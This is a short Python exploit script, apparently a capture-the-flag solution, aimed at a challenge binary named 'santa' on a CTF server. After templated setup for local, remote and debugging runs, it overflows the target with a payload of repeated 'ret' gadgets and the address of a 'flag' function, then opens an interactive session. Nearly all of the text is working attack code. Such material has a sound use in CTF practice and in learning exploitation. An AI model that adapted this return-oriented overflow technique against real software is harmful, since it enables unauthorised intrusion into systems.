#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

from rootkit import *
import os
import time

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('santa')
host = args.HOST or 'server.challenge.ctf.thefewchosen.com'
port = int(args.PORT or 1340)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

re()

sl(p(gadget("ret"))*10 + p(exe.sym.flag)*10)

io.interactive()
